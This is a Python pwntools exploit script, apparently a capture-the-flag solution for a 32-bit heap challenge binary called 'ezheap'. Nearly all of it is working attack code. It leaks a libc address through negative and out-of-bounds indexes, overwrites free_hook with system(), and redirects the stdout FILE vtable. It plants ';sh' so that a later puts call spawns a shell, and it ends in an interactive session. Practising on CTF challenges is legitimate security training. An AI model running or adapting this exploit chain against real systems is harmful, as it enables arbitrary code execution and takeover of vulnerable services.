# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './ezheap'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    p = process(binary)
    libc = elf.libc
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(
        ['one_gadget','--raw', '-f',filename]
    )).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>>',num)

def show( element_idx = 496 , idx = -2071 ):
    cmd(3)
    sla('type' , 3)
    sla('idx>>' , idx)
    sla('element_idx>>' , element_idx)

def edit( element_idx = 496 ,num = 0 , idx = -2071):
    cmd(2)
    sla('type' , 3)
    sla('idx>>' , idx)
    sla('element_idx>>' , element_idx)
    sla('value>>' , num)

bss_addr = 0x00004040

# 可以通过got偏移，获得libc的bss段读取写⼊权限，然后打stdout的虚表微偏移，打到附近的⼀个虚表，调⽤puts
# 时会调⽤free(stdout+固定偏移)，在固定偏移附近布局 ;sh\\x00 ，再改写free hook

# dbg('*$rebase(0x0000145E)')
show( 496+148//4 )
ru('value>>\n')
fvtbl = int(p.recv(10))

libc.address = fvtbl - libc.sym['_IO_file_jumps']
system_addr = libc.sym['system']

# lg('system_addr',system_addr)

edit( 496 , 0 )
edit( (0xf7fcd8d0-0xf7fcc5c0)//4 , system_addr )
edit( 496 , 0 )
edit( 496 , 0 )

fvtbl += 0xE0 - 0x80 - 8
edit( 496+72//4+1 , u32(b';sh\x00') )

edit( 496+148//4 , fvtbl)

# dbg()


p.interactive()

'''
@File    :   ezheap.py
@Time    :   2021/10/04 17:35:44
@Author  :   Niyah 
'''